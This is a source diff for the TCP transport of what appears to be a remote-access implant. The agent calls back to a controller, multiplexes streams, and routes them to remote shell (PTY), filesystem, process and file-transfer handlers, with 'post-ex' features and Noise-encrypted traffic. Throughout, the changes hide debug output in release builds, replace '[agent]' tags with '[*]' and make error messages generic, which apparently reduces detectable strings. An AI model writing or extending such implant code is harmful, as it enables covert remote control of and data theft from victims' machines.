@@ -6,7 +6,7 @@ use crate::backoff::ExponentialBackoff;
 use crate::config::{get_aes_key, get_aes_key_base};
 use crate::crypto;
 use crate::error::{ClientError, Result};
-use crate::transport::session_crypto::{seal_for_wire, traffic_key, FragReassembler, OpenResult};
+use crate::transport::traffic_crypto::{seal_for_wire, traffic_key, FragReassembler, OpenResult};
 use crate::transport::Transport;
 use async_trait::async_trait;
 use std::io::Write;
@@ -77,10 +77,11 @@ impl Transport for TcpTransport {
 
         loop {
             attempts += 1;
-            crate::utils::db_print(&format!(
+            #[cfg(debug_assertions)]
+            crate::db_print!(
                 "Connecting to {}... (attempt {}/{})",
                 addr, attempts, MAX_ATTEMPTS
-            ));
+            );
             match TcpStream::connect(&addr).await {
                 Ok(stream) => {
                     // 🛡️ [Hardening] Configure low-level socket options
@@ -94,7 +95,8 @@ impl Transport for TcpTransport {
                         let stream = match TcpStream::from_std(socket.into()) {
                             Ok(s) => s,
                             Err(_) => {
-                                crate::utils::db_print("[agent] Failed to re-wrap TCP stream");
+                                #[cfg(debug_assertions)]
+                                crate::db_print!("[*] Failed to re-wrap TCP stream");
                                 if attempts >= MAX_ATTEMPTS {
                                     return Err(ClientError::ConnectionError(
                                         "tcp re-wrap failed after max attempts".into(),
@@ -105,7 +107,8 @@ impl Transport for TcpTransport {
                                 continue;
                             }
                         };
-                        crate::utils::db_print("[agent] TCP hardened socket ready.");
+                        #[cfg(debug_assertions)]
+                        crate::db_print!("[*] secure socket ready.");
 
                         let mut yamux_config = Config::default();
                         // 缓冲区大小：16MB（足够大文件传输，但不会 OOM）
@@ -120,25 +123,28 @@ impl Transport for TcpTransport {
 
                         // 🛠 全功能多路复用调度器 (带并发限制)
                         tokio::spawn(async move {
-                            crate::utils::db_print("[Yamux] Connection driver started.");
+                            #[cfg(debug_assertions)]
+                            crate::db_print!("[*] Connection driver started.");
                             // 限制并发流数量，防止资源耗尽
                             let stream_semaphore =
                                 std::sync::Arc::new(tokio::sync::Semaphore::new(16));
                             loop {
                                 match connection.next_stream().await {
-                                    Ok(Some(stream)) => {
-                                        let stream_id = stream.id();
-                                        crate::utils::db_print(&format!(
-                                            "[Yamux] New stream incoming. ID: {}",
-                                            stream_id
-                                        ));
+                                Ok(Some(stream)) => {
+                                    let stream_id = stream.id();
+                                    #[cfg(debug_assertions)]
+                                    crate::db_print!(
+                                        "[*] New stream incoming. ID: {}",
+                                        stream_id
+                                        );
                                         let permit = match stream_semaphore
                                             .clone()
                                             .try_acquire_owned()
                                         {
                                             Ok(p) => p,
                                             Err(_) => {
-                                                crate::utils::db_print(&format!("[Yamux] Stream {} rejected: max concurrency reached", stream_id));
+                                                #[cfg(debug_assertions)]
+                                                crate::db_print!("[*] Stream {} rejected: max concurrency reached", stream_id);
                                                 drop(stream); // Close the stream
                                                 continue;
                                             }
@@ -149,14 +155,16 @@ impl Transport for TcpTransport {
                                             let mut stream = stream;
                                             let mut type_buf = [0u8; 1];
                                             if let Err(e) = stream.read_exact(&mut type_buf).await {
-                                                crate::utils::db_print(&format!("[Yamux] Failed to read stream type for ID {}: {}", stream_id, e));
+                                                #[cfg(debug_assertions)]
+                                                crate::db_print!("[*] Failed to read stream type for ID {}: {}", stream_id, e);
                                                 return;
                                             }
 
-                                            crate::utils::db_print(&format!(
-                                                "[Yamux] Stream {} Type: 0x{:02X}",
+                                            #[cfg(debug_assertions)]
+                                            crate::db_print!(
+                                                "[*] Stream {} Type: 0x{:02X}",
                                                 stream_id, type_buf[0]
-                                            ));
+                                            );
                                             use crate::transport::stream_types::{
                                                 YAMUX_STREAM_FILE, YAMUX_STREAM_FS,
                                                 YAMUX_STREAM_PROCESS, YAMUX_STREAM_PTY,
@@ -166,7 +174,8 @@ impl Transport for TcpTransport {
                                                 YAMUX_STREAM_PTY => {
                                                     #[cfg(feature = "pty")]
                                                     {
-                                                        crate::utils::db_print(&format!("[Yamux] Routing to PTY handler (Stream {})", stream_id));
+                                                        #[cfg(debug_assertions)]
+                                                        crate::db_print!("[*] Routing to PTY handler (Stream {})", stream_id);
                                                         let _ = std::io::stdout().flush();
                                                         crate::pty::handle_stream(stream).await;
                                                     }
@@ -220,10 +229,11 @@ impl Transport for TcpTransport {
                                                     // Binary put/get — same feature gate as FS (0x03)
                                                     #[cfg(feature = "post-ex")]
                                                     {
-                                                        crate::utils::db_print(&format!(
-                                                            "[Yamux] Routing to FILE handler (Stream {})",
+                                                        #[cfg(debug_assertions)]
+                                                        crate::db_print!(
+                                                            "[*] Routing to FILE handler (Stream {})",
                                                             stream_id
-                                                        ));
+                                                        );
                                                         crate::file_stream::handle_stream(stream)
                                                             .await;
                                                     }
@@ -240,25 +250,28 @@ impl Transport for TcpTransport {
                                                     }
                                                 }
                                                 _ => {
-                                                    crate::utils::db_print(&format!(
-                                                        "[Yamux] Unknown type: 0x{:02X}",
+                                                    #[cfg(debug_assertions)]
+                                                    crate::db_print!(
+                                                        "[*] Unknown type: 0x{:02X}",
                                                         type_buf[0]
-                                                    ));
+                                                    );
                                                 }
                                             }
                                         });
                                     }
                                     Ok(None) => {
-                                        crate::utils::db_print(
-                                            "[Yamux] Connection driver reached EOF.",
+                                        #[cfg(debug_assertions)]
+                                        crate::db_print!(
+                                            "[*] Connection driver reached EOF."
                                         );
                                         break;
                                     }
                                     Err(e) => {
-                                        crate::utils::db_print(&format!(
-                                            "[Yamux] Connection driver error: {}",
+                                        #[cfg(debug_assertions)]
+                                        crate::db_print!(
+                                            "[*] Connection driver error: {}",
                                             e
-                                        ));
+                                        );
                                         break;
                                     }
                                 }
@@ -279,7 +292,8 @@ impl Transport for TcpTransport {
                             }
                         };
 
-                        crate::utils::db_print("[agent] Control established.");
+                        #[cfg(debug_assertions)]
+                        crate::db_print!("[*] Control established.");
                         self.control_stream = Some(control_stream.compat());
                         self.noise_session_key = None;
                         self.reassembler.clear();
@@ -339,18 +353,20 @@ impl Transport for TcpTransport {
                                 ClientError::ConnectionError(format!("Noise complete: {e}"))
                             })?;
                             self.noise_session_key = Some(session_key);
-                            crate::utils::db_print(
-                                "[agent] X25519 Noise OK — traffic uses session key",
+                            #[cfg(debug_assertions)]
+                            crate::db_print!(
+                                "[*] X25519 Noise OK — traffic uses session key"
                             );
                         }
 
                         self.backoff.reset();
                         return Ok(());
                     } else {
-                        crate::utils::db_print("[agent] Socket hardening failed, retrying...");
+                        #[cfg(debug_assertions)]
+                        crate::db_print!("[*] Socket hardening failed, retrying...");
                         if attempts >= MAX_ATTEMPTS {
                             return Err(ClientError::ConnectionError(
-                                "tcp socket harden failed after max attempts".into(),
+                                "connect setup failed".into(),
                             ));
                         }
                         let delay = self.backoff.next_delay();
@@ -360,15 +376,16 @@ impl Transport for TcpTransport {
                 Err(e) => {
                     if attempts >= MAX_ATTEMPTS {
                         return Err(ClientError::ConnectionError(format!(
-                            "tcp connect failed after {} attempts: {}",
-                            MAX_ATTEMPTS, e
+                            "connect failed ({}/{}): {}",
+                            MAX_ATTEMPTS, MAX_ATTEMPTS, e
                         )));
                     }
                     let delay = self.backoff.next_delay();
-                    crate::utils::db_print(&format!(
+                    #[cfg(debug_assertions)]
+                    crate::db_print!(
                         "Retry in {:?} ({}/{}): {}",
                         delay, attempts, MAX_ATTEMPTS, e
-                    ));
+                    );
                     sleep(delay).await;
                 }
             }
